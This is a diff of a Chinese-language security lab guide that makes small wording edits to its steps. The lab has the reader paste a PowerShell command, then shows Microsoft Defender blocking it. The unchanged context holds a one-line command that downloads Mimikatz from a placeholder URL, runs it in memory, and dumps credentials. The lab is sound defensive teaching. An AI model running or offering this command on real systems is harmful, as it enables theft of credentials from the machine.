@@ -14,13 +14,13 @@
 
 1. 在 WIN1 计算机上，在搜索栏中键入“Command”，然后选择“以管理员身份运行”**********。
 
-1. 在“管理员:**** 命令提示符”窗口中复制并粘贴以下命令，然后按 Enter 键运行****。
+1. 在“管理员:**** 命令提示符”窗口中复制粘贴以下命令，然后按 Enter 键运行****。
 
     ```CommandPrompt
     powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
     ```
 
-1. 应看到一条内容为“访问被拒绝”的消息，以及来自 `Microsoft Defender Antivirus, Windows Security Virus and threats protection` 的弹出消息，其中显示“发现威胁”****。
+1. 你应看到一条内容为“访问被拒绝”的消息，以及来自 `Microsoft Defender Antivirus, Windows Security Virus and threats protection` 的弹出消息，其中显示“发现威胁”****。
 
 1. 通过键入“exit”并按 Enter 键，退出“管理员:**命令提示符”窗口**********。
 
